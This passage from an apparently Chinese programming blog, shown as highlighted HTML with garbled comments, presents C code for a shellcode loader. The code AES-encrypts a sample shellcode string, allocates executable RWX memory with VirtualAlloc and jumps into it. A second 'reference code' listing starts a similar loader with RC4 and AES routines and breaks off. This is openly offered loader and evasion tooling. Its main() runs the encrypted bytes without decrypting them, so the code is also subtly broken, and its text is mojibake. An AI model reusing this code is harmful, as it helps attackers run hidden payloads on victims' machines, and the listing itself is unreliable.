Â  Â  Â  temp[<span class="number">1</span>] = temp[<span class="number">2</span>];</span><br><span class="line">Â  Â  Â  Â  Â  Â  temp[<span class="number">2</span>] = temp[<span class="number">3</span>];</span><br><span class="line">Â  Â  Â  Â  Â  Â  temp[<span class="number">3</span>] = t;</span><br><span class="line">Â  Â  Â  Â  Â  Â Â <span class="comment">// S-boxä»£æ¢</span></span><br><span class="line">Â  Â  Â  Â  Â  Â Â <span class="keyword">for</span>Â (<span class="type">int</span>Â i =Â <span class="number">0</span>; i &lt;Â <span class="number">4</span>; i++)</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  temp[i] = sbox[temp[i]];</span><br><span class="line">Â  Â  Â  Â  Â  Â Â <span class="comment">// ä¸Rconå¼‚æˆ–</span></span><br><span class="line">Â  Â  Â  Â  Â  Â  temp[<span class="number">0</span>] ^= Rcon[rconIteration];</span><br><span class="line">Â  Â  Â  Â  Â  Â  rconIteration++;</span><br><span class="line">Â  Â  Â  Â  &#125;</span><br><span class="line">Â  Â  Â  Â Â <span class="comment">// ç”Ÿæˆæ–°ä¸€è½®å¯†é’¥å­—èŠ‚</span></span><br><span class="line">Â  Â  Â  Â Â <span class="keyword">for</span>Â (<span class="type">int</span>Â i =Â <span class="number">0</span>; i &lt;Â <span class="number">4</span>; i++) &#123;</span><br><span class="line">Â  Â  Â  Â  Â  Â  roundKeys[bytesGenerated] = roundKeys[bytesGenerated -Â <span class="number">16</span>] ^ temp[i];</span><br><span class="line">Â  Â  Â  Â  Â  Â  bytesGenerated++;</span><br><span class="line">Â  Â  Â  Â  &#125;</span><br><span class="line">Â  Â  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¯¹å•ä¸ª16å­—èŠ‚æ•°æ®å—è¿›è¡ŒAES-128åŠ å¯†</span></span><br><span class="line"><span class="function"><span class="type">void</span>Â <span class="title">AES_encrypt_block</span><span class="params">(<span class="type">const</span>Â <span class="type">unsigned</span>Â <span class="type">char</span>Â in[<span class="number">16</span>],Â <span class="type">unsigned</span>Â <span class="type">char</span>Â out[<span class="number">16</span>],Â <span class="type">const</span>Â <span class="type">unsigned</span>Â <span class="type">char</span>Â roundKeys[<span class="number">176</span>])</span>Â </span>&#123;</span><br><span class="line">Â  Â Â <span class="type">unsigned</span>Â <span class="type">char</span>Â state[<span class="number">16</span>];</span><br><span class="line">Â  Â Â <span class="built_in">memcpy</span>(state, in,Â <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">Â  Â Â <span class="comment">// åˆå§‹è½®å¯†é’¥åŠ </span></span><br><span class="line">Â  Â  <span class="built_in">AddRoundKey</span>(state, roundKeys);</span><br><span class="line"></span><br><span class="line">Â  Â Â <span class="comment">// 9è½®å¸¸è§„è½®å˜æ¢</span></span><br><span class="line">Â  Â Â <span class="keyword">for</span>Â (<span class="type">int</span>Â round =Â <span class="number">1</span>; round &lt;Â <span class="number">10</span>; round++) &#123;</span><br><span class="line">Â  Â  Â  Â  <span class="built_in">SubBytes</span>(state);</span><br><span class="line">Â  Â  Â  Â  <span class="built_in">ShiftRows</span>(state);</span><br><span class="line">Â  Â  Â  Â  <span class="built_in">MixColumns</span>(state);</span><br><span class="line">Â  Â  Â  Â  <span class="built_in">AddRoundKey</span>(state, roundKeys + round *Â <span class="number">16</span>);</span><br><span class="line">Â  Â  &#125;</span><br><span class="line"></span><br><span class="line">Â  Â Â <span class="comment">// ç¬¬10è½®ï¼ˆæ— MixColumnsï¼‰</span></span><br><span class="line">Â  Â  <span class="built_in">SubBytes</span>(state);</span><br><span class="line">Â  Â  <span class="built_in">ShiftRows</span>(state);</span><br><span class="line">Â  Â  <span class="built_in">AddRoundKey</span>(state, roundKeys +Â <span class="number">10</span>Â *Â <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">Â  Â Â <span class="built_in">memcpy</span>(out, state,Â <span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// --- CBCæ¨¡å¼ä¸‹çš„AESåŠ å¯†å‡½æ•° ---</span></span><br><span class="line"><span class="comment">// è¿™é‡Œå¯¹æ•°æ®æŒ‰16å­—èŠ‚åˆ†ç»„ï¼Œæ•°æ®ä¸è¶³16å­—èŠ‚æ—¶ä½¿ç”¨é›¶å¡«å……</span></span><br><span class="line"><span class="function"><span class="type">void</span>Â <span class="title">aes_encrypt</span><span class="params">(<span class="type">unsigned</span>Â <span class="type">char</span>Â *data,Â <span class="type">int</span>Â data_len,Â <span class="type">unsigned</span>Â <span class="type">char</span>Â *key,Â <span class="type">unsigned</span>Â <span class="type">char</span>Â *iv)</span>Â </span>&#123;</span><br><span class="line">Â  Â Â <span class="comment">// è®¡ç®—å¡«å……åæ•°æ®é•¿åº¦ï¼ˆ16çš„å€æ•°ï¼‰</span></span><br><span class="line">Â  Â Â <span class="type">int</span>Â padded_len = ((data_len +Â <span class="number">15</span>) /Â <span class="number">16</span>) *Â <span class="number">16</span>;</span><br><span class="line">Â  Â Â <span class="type">unsigned</span>Â <span class="type">char</span>Â *buffer = (<span class="type">unsigned</span>Â <span class="type">char</span>Â *)<span class="built_in">malloc</span>(padded_len);</span><br><span class="line">Â  Â Â <span class="built_in">memcpy</span>(buffer, data, data_len);</span><br><span class="line">Â  Â Â <span class="comment">// å¯¹ä¸è¶³éƒ¨åˆ†ä½¿ç”¨0å¡«å……</span></span><br><span class="line">Â  Â Â <span class="built_in">memset</span>(buffer + data_len,Â <span class="number">0</span>, padded_len - data_len);</span><br><span class="line"></span><br><span class="line">Â  Â Â <span class="type">unsigned</span>Â <span class="type">char</span>Â roundKeys[<span class="number">176</span>];</span><br><span class="line">Â  Â  <span class="built_in">KeyExpansion</span>(key, roundKeys);</span><br><span class="line"></span><br><span class="line">Â  Â Â <span class="type">unsigned</span>Â <span class="type">char</span>Â prev[<span class="number">16</span>];</span><br><span class="line">Â  Â Â <span class="built_in">memcpy</span>(prev, iv,Â <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">Â  Â Â <span class="comment">// æŒ‰16å­—èŠ‚å—è¿›è¡ŒCBCåŠ å¯†</span></span><br><span class="line">Â  Â Â <span class="keyword">for</span>Â (<span class="type">int</span>Â i =Â <span class="number">0</span>; i &lt; padded_len; i +=Â <span class="number">16</span>) &#123;</span><br><span class="line">Â  Â  Â  Â Â <span class="comment">// ä¸å‰ä¸€ä¸ªå¯†æ–‡å—ï¼ˆæˆ–IVï¼‰å¼‚æˆ–</span></span><br><span class="line">Â  Â  Â  Â Â <span class="keyword">for</span>Â (<span class="type">int</span>Â j =Â <span class="number">0</span>; j &lt;Â <span class="number">16</span>; j++)</span><br><span class="line">Â  Â  Â  Â  Â  Â  buffer[i+j] ^= prev[j];</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â Â <span class="type">unsigned</span>Â <span class="type">char</span>Â out[<span class="number">16</span>];</span><br><span class="line">Â  Â  Â  Â  <span class="built_in">AES_encrypt_block</span>(buffer + i, out, roundKeys);</span><br><span class="line">Â  Â  Â  Â Â <span class="built_in">memcpy</span>(buffer + i, out,Â <span class="number">16</span>);</span><br><span class="line">Â  Â  Â  Â Â <span class="comment">// æ›´æ–°prevä¸ºå½“å‰å¯†æ–‡å—</span></span><br><span class="line">Â  Â  Â  Â Â <span class="built_in">memcpy</span>(prev, out,Â <span class="number">16</span>);</span><br><span class="line">Â  Â  &#125;</span><br><span class="line">Â  Â Â <span class="comment">// å°†åŠ å¯†åçš„æ•°æ®å¤åˆ¶å›åŸdataä¸­ï¼ˆæ³¨æ„ï¼šå¯èƒ½æ¯”åŸdataé•¿ï¼Œå¦‚æœdataæ‰€åœ¨ç©ºé—´è¶³å¤Ÿï¼‰</span></span><br><span class="line">Â  Â Â <span class="built_in">memcpy</span>(data, buffer, padded_len);</span><br><span class="line">Â  Â Â <span class="built_in">free</span>(buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// --- ä¸»å‡½æ•°ç¤ºä¾‹ ---</span></span><br><span class="line"><span class="comment">// åŠ å¯†Shellcodeååˆ†é…å†…å­˜å¹¶æ‰§è¡Œ</span></span><br><span class="line"><span class="function"><span class="type">int</span>Â <span class="title">main</span><span class="params">()</span>Â </span>&#123;</span><br><span class="line">Â  Â Â <span class="comment">// ç¤ºä¾‹Shellcode</span></span><br><span class="line">Â  Â Â <span class="type">unsigned</span>Â <span class="type">char</span>Â shellcode[] =Â <span class="string">&quot;\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b&quot;</span>;</span><br><span class="line">Â  Â Â <span class="type">unsigned</span>Â <span class="type">char</span>Â key[] =Â <span class="string">&quot;1234567890123456&quot;</span>;Â <span class="comment">// 16å­—èŠ‚å¯†é’¥</span></span><br><span class="line">Â  Â Â <span class="type">unsigned</span>Â <span class="type">char</span>Â iv[] Â =Â <span class="string">&quot;1234567890123456&quot;</span>;Â <span class="comment">// 16å­—èŠ‚åˆå§‹åŒ–å‘é‡</span></span><br><span class="line"></span><br><span class="line">Â  Â Â <span class="type">int</span>Â shellcode_len =Â <span class="built_in">sizeof</span>(shellcode) -Â <span class="number">1</span>;Â <span class="comment">// æ’é™¤å­—ç¬¦ä¸²ç»“æŸç¬¦</span></span><br><span class="line"></span><br><span class="line">Â  Â Â <span class="comment">// æ‰§è¡ŒAES CBCåŠ å¯†ï¼ˆåŸåœ°åŠ å¯†ï¼Œå¡«å……å¯èƒ½ä¼šæ‰©å……æ•°æ®ï¼Œä½¿ç”¨æ—¶è¯·ç¡®ä¿è¶³å¤Ÿç©ºé—´ï¼‰</span></span><br><span class="line">Â  Â  <span class="built_in">aes_encrypt</span>(shellcode, shellcode_len, key, iv);</span><br><span class="line"></span><br><span class="line">Â  Â Â <span class="comment">// åˆ†é…å†…å­˜å¹¶æ‰§è¡ŒåŠ å¯†åçš„Shellcode</span></span><br><span class="line">Â  Â Â <span class="type">void</span>* exec = <span class="built_in">VirtualAlloc</span>(<span class="number">0</span>, shellcode_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">Â  Â Â <span class="built_in">memcpy</span>(exec, shellcode, shellcode_len);</span><br><span class="line">Â  Â  ((<span class="built_in">void</span>(*)())exec)();</span><br><span class="line"></span><br><span class="line">Â  Â Â <span class="keyword">return</span>Â <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="å‚è€ƒä»£ç ">å‚è€ƒä»£ç </h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ---------------- RC4åŠ å¯† ----------------</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">rc4_crypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *data,Â <span class="type">int</span>Â data_len, <span class="type">unsigned</span> <span class="type">char</span> *key,Â <span class="type">int</span>Â key_len)</span> </span>&#123;</span><br><span class="line">Â  Â  <span class="type">unsigned</span> <span class="type">char</span> S[<span class="number">256</span>];</span><br><span class="line">Â  Â Â <span class="type">int</span>Â i, j =Â <span class="number">0</span>;</span><br><span class="line">Â  Â Â </span><br><span class="line">Â  Â Â <span class="comment">// åˆå§‹åŒ–Sæ•°ç»„</span></span><br><span class="line">Â  Â Â <span class="keyword">for</span>Â (i =Â <span class="number">0</span>; i &lt;Â <span class="number">256</span>; i++) &#123;</span><br><span class="line">Â  Â  Â  Â  S[i] = (<span class="type">unsigned</span> <span class="type">char</span>)i;</span><br><span class="line">Â  Â  &#125;</span><br><span class="line">Â  Â Â </span><br><span class="line">Â  Â Â <span class="comment">// å¯†é’¥è°ƒåº¦ç®—æ³• (KSA)</span></span><br><span class="line">Â  Â Â <span class="keyword">for</span>Â (i =Â <span class="number">0</span>; i &lt;Â <span class="number">256</span>; i++) &#123;</span><br><span class="line">Â  Â  Â  Â  j = (j + S[i] + key[i % key_len]) &amp;Â <span class="number">0xFF</span>;</span><br><span class="line">Â  Â  Â  Â  <span class="type">unsigned</span> <span class="type">char</span> temp = S[i];</span><br><span class="line">Â  Â  Â  Â  S[i] = S[j];</span><br><span class="line">Â  Â  Â  Â  S[j] = temp;</span><br><span class="line">Â  Â  &#125;</span><br><span class="line">Â  Â Â </span><br><span class="line">Â  Â Â <span class="comment">// ä¼ªéšæœºæ•°ç”Ÿæˆç®—æ³• (PRGA)</span></span><br><span class="line">Â  Â  i =Â <span class="number">0</span>;</span><br><span class="line">Â  Â  j =Â <span class="number">0</span>;</span><br><span class="line">Â  Â Â <span class="keyword">for</span>Â (<span class="type">int</span>Â k =Â <span class="number">0</span>; k &lt; data_len; k++) &#123;</span><br><span class="line">Â  Â  Â  Â  i = (i +Â <span class="number">1</span>) &amp;Â <span class="number">0xFF</span>;</span><br><span class="line">Â  Â  Â  Â  j = (j + S[i]) &amp;Â <span class="number">0xFF</span>;</span><br><span class="line">Â  Â  Â  Â  <span class="type">unsigned</span> <span class="type">char</span> temp = S[i];</span><br><span class="line">Â  Â  Â  Â  S[i] = S[j];</span><br><span class="line">Â  Â  Â  Â  S[j] = temp;</span><br><span class="line">Â  Â  Â  Â  <span class="type">unsigned</span> <span class="type">char</span> rnd = S[(S[i] + S[j]) &amp;Â <span class="number">0xFF</span>];</span><br><span class="line">Â  Â  Â  Â  data[k] ^= rnd;</span><br><span class="line">Â  Â  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ---------------- AESåŠ å¯†ï¼ˆçº¯Cå®ç°ï¼Œæ— ç¬¬ä¸‰æ–¹åº“ï¼‰ ----------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// AES S-box</span></span><br><span class="line"><span class="type">static</span>Â <span class="type">const</span>Â <span class="type">unsigned</span> <span class="type">char</span> sbox[<span class="number">256</span>] = &#123;</span><br><span class="line">Â  Â Â <span class="number">0x63</span>,<span class="number">0x7c</span>,<span class="number">0x77</span>,<span class="number">0x7b</span>,<span class="number">0xf2</span>,<span class="number">0x6b</span>,<span class="number">0x6f</span>,<span class="number">0xc5</span>,<span class="number">0x30</span>,<span class="number">0x01</span>,<span class="number">0x67</span>,<span class="number">0x2b</span>,<span class="number">0xfe</span>,<span class="number">0xd7</span>,<span class="number">0xab</span>,<span class="number">0x76</span>,</span><br><span class="line">Â  Â Â <span class="number">0xca</span>,<span class="number">0x82</span>,<span class="number">0xc9</span>,<span class="number">0x7d</span>,<span class="number">0xfa</span>,<span class="number">0x59</span>,<span class="number">0x47</span>,<span class="number">0xf0</span>,<span class="number">0xad</span>,<span class="number">0xd4</span>,<span class="number">0xa2</span>,<span class="number">0xaf</span>,<span class="number">0x9c</span>,<span class="number">0xa4</span>,<span class="number">0x72</span>,<span class="number">0xc0</span>,</span><br><span class="line">Â  Â Â <span class="number">0xb7</span>,<span class="number">0xfd</span>,<span class="number">0x93</span>,<span class="number">0x26</span>,<span class="number">0x36</span>,<span class="number">0x3f</span>,<span class="number">0xf7</span>,<span class="number">0xcc</span>,<span class="number">0x34</span>,<span class="number">0xa5</span>,<span class="number">0xe5</span>,<span class="number">0xf1</span>,<span class="number">0x71</span>,<span class="number">0xd8</span>,<span class="number">0x31</span>,<span class="number">0x15</span>,</span><br><span class="line">Â  Â Â <span class="number">0x04</span>,<span class="number">0xc7</span>,<span class="number">0x23</span>,<span class="number">0xc3</span>,<span class="number">0x18</span>,<span class="number">0x96</span>,<span class="number">0x05</span>,<span class="number">0x9a</span>,<span class="number">0x07</span>,<span class="number">0x12</span>,<span class="number">0x80</span>,<span class="number">0xe2</span>,<span class="number">0xeb</span>,<span class="number">0x27</span>,<span class="number">0xb2</span>,<span class="number">0x75</span>,</span><br><span class="line">Â  Â Â <span class="number">0x09</span>,<span class="number">0x83</span>,<span class="number">0x2c</span>,<span class="number">0x1a</span>,<span class="number">0x1b</span>,<span class="number">0x6e</span>,<span class="number">0x5a</span>,<span class="number">0xa0</span>,<span class="number">0x52</span>,<span class="number">0x3b</span>,<span class="number">0xd6</span>,<span class="number">0xb3</span>,<span class="number">0x29</span>,<span class="number">0xe3</span>,<span class="number">0x2f</span>,<span class="number">0x84</span>,</span><br><span class="line">Â  Â Â <span class="number">0x53</span>,<span class="number">0xd1</span>,<span class="number">0x00</span>,<span class="number">0xed</span>,<span class="number">0x20</span>,<span class="number">0xfc</span>,<span class="number">0xb1</span>,<span class="number">0x5b</span>,<span class="number">0x6a</span>,<span class="number">0xcb</span>,<span class="number">0xbe</span>,<span class="number">0x39</span>,<span class="number">0x4a</span>,<span class="number">0x4c</span>,<span class="number">0x58</span>,<span class="number">0xcf</span>,</span><br><span class="line">Â  Â Â <span class="number">0xd0</span>,<span class="number">0xef</span>,<span class="number">0xaa</span>,<span class="number">0xfb</span>,<span class="number">0x43</span>,<span class="number">0x4d</span>,<span class="number">0x33</span>,<span class="number">0x85</span>,<span class="number">0x45</span>,<span class="number">0xf9</span>,<span class="number">0x02</span>,<span class="number">0x7f</span>,<span class="number">0x50</span>,<span class="number">0x3c</span>,<span class="number">0x9f</span>,<span class="number">0xa8</span>,</span><br><span class="line">Â  Â Â <span class="number">0x51</span>,<span class="number">0xa3</span>,<span class="number">0x40</span>,<span class="number">0x8f</span>,<span class="number">0x92</span>,<span class="number">0x9d</span>,<span class="number">0x38</span>,<span class="number">0xf5</span>,<span class="number">0xbc</span>,<span class="number">0xb6</span>,<span class="number">0xda</span>,<span class="number">0x21</span>,<span class="number">0x10</span>,<span class="number">0xff</span>,<span class="number">0xf3</span>,<span class="number">0xd2</span>,</span><br><span class="line">Â  Â Â <span class="number">0xcd</span>,<span class="number">0x0c</span>,<span class="number">0x13</span>,<span class="number">0xec</span>,<span class="number">0x5f</span>,<span class="number">0x97</span>,<span class="number">0x44</span>,<span class="number">0x17</span>,<span class="number">0xc4</span>,<span class="number">0xa7</span>,<span class="number">0x7e</span>,<span class="number">0x3d</span>,<span class="number">0x64</span>,<span class="number">0x5d</span>,<span class="number">0x19</span>,<span class="number">0x73</span>,</span><br><span class="line">Â  Â Â <span class="number">0x60</span>,<span class="number">0x81</span>,<span class="number">0x4f</span>,<span class="number">0xdc</span>,<span class="number">0x22</span>,<span class="number">0x2a</span>,<span class="number">0x90</span>,<span class="number">0x88</span>,<span class="number">0x46</span>,<span class="number">0xee</span>,<span class="number">0xb8</span>,<span class="number">0x14</span>,<span class="number">0xde</span>,<span class="number">0x5e</span>,<span class="number">0x0b</span>,<span class="number">0xdb</span>,</span><br><span class="line">Â  Â Â <span class="number">0xe0</span>,<span class="number">0x32</span>,<span class="number">0x3a</span>,<span class="number">0x0a</span>,<span class="number">0x49</span>,<span class="number">0x06</span>,<span class="number">0x24</span>,<span class="number">0x5c</span>,<span class="number">0xc2</span>,<span class="number">0xd3</span>,<span class="number">0xac</span>,<span class="number">0x62</span>,<span class="number">0x91</span>,<span class="number">0x95</span>,<span class="number">0xe4</span>,<span class="number">0x79</span>,</span><br><span class="line">Â  Â Â <span class="number">0xe7</span>,<span class="number">0xc8</span>,<span class="number">0x37</span>,<span class="number">0x6d</span>,<span class="number">0x8d</span>,<span class="number">0xd5</span>,<span class="number">0x4e</span>,<span class="number">0xa9</span>,<span class="number">0x6c</span>,<span class="number">0x56</span>,<span class="number">0xf4</span>,<span class="number">0xea</span>,<span class="number">0x65</span>,<span class="number">0x7a</span>,<span class="number">0xae</span>,<span class="number">0x08</span>,</span><br><span class="line">Â  Â Â <span class="number">0xba</span>,<span class="number">0x78</span>,<span class="number">0x25</span>,<span class="number">0x2e</span>,<span class="number">0x1c</span>,<span class="number">0xa6</span>,<span class="number">0xb4</span>,<span class="number">0xc6</span>,<span class="number">0xe8</span>,<span class="number">0xdd</span>,<span class="number">0x74</span>,<span class="number">0x1f</span>,<span class="number">0x4b</span>,<span class="number">0xbd</span>,<span class="number">0x8b</span>,<span class="number">0x8a</span>,</span><br><span class="line">Â  Â Â <span class="number">0x70</span>,<span class="number">0x3e</span>,<span class="number">0xb5</span>,<span class="number">0x66</span>,<span class="number">0x48</span>,<span class="number">0x03</span>,<span class="number">0xf6</span>,<span class="number">0x0e</span>,<span class="number">0x61</span>,<span class="number">0x35</span>,<span class="number">0x57</span>,<span class="number">0xb9</span>,<span class="number">0x86</span>,<span class="number">0xc1</span>,<span class="number">0x1d</span>,<span class="number">0x9e</span>,</span><br><span class="line">Â  Â Â <span class="number">0xe1</span>,<span class="number">0xf8</span>,<span class="number">0x98</span>,<span class="number">0x11</span>,<span class="number">0x69</span>,<span class="number">0xd9</span>,<span class="number">0x8e</span>,<span class="number">0x94</span>,<span class="number">0x9b</span>,<span class="number">0x1e</span>,<span class="number">0x87</span>,<span class="number">0xe9</span>,<span class="number">0xce</span>,<span class="number">0x55</span>,<span class="number">0x28</span>,<span class="number">0xdf</span>,</span><br><span class="line">Â  Â Â <span class="number">0x8c</span>,<span class="number">0xa1</span>,<span class="number">0x89</span>,<span class="number">0x0d</span>,<span class="number">0xbf</span>,<span class="number">0xe6</span>,<span class="number">0x42</span>,<span class="number">0x68</span>,<span class="number">0x41</span>,<span class="number">0x99</span>,<span class="number">0x2d</span>,<span class="number">0x0f</span>,<span class="number">0xb0</span>,<span class="number">0x54</span>,<span class="number">0xbb</span>,<span class="number">0x16</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// AES Rconæ•°ç»„ï¼Œç”¨äºå¯†é’¥æ‰©å±•</span></span><br><span class="line"><span class="type">static</span>Â <span class="type">const</span>Â <span class="type">unsigned</span> <span class="type">char</span> Rcon[<span class="number">11</span>] = &#123;Â </span><br><span class="line">Â  Â Â <span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x02</span>,<span class="number">0x04</span>,<span class="number">0x08</span>,<span class="number">0x10</span>,<span class="number">0x20</span>,<span class="number">0x40</span>,<span class="number">0x80</span>,<span class="number">0x1B</span>,<span class="number">0x36</span>Â </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// xtimeå‡½æ•°ï¼šGF(2^8)ä¸­ä¹˜2è¿ç®—</span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">char</span> <span class="title">xtime</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> x)</span> </span>&#123;</span><br><span class="line">Â  Â Â <span class="keyword">return</span>Â (x &lt;&lt;Â <span class="number">1</span>) ^ ((x &gt;&gt;Â <span class="number">7</span>) &amp;Â <span class="number">1</span>Â ?Â <span class="number">0x1B</span>Â :Â <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ·»åŠ è½®å¯†é’¥</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">AddRoundKey</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> state[<span class="number">16</span>],Â <span class="type">const</span>Â <span class="type">unsigned</span> <span class="type">char</span> roundKey[<span class="number">16</span>])</span> </span>&#123;</span><br><span class="line">Â  Â Â <span class="keyword">for</span>Â (<span class="type">int</span>Â i =Â <span class="number">0</span>; i &lt;Â <span class="number">16</span>; i++)</span><br><span class="line">Â  Â  Â  Â  state[i] ^= roundKey[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å­—èŠ‚ä»£æ¢</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SubBytes</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> state[<span class="number">16</span>])</span> </span>&#123;</span><br><span class="line">Â  Â Â <span class="keyword">for</span>Â (<span class="type">int</span>Â i =Â <span class="number">0</span>; i &lt;Â <span class="number">16</span>; i++)</span><br><span class="line">Â  Â  Â  Â  state[i] = sbox[state[i]];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¡Œç§»ä½</span></span><br><span 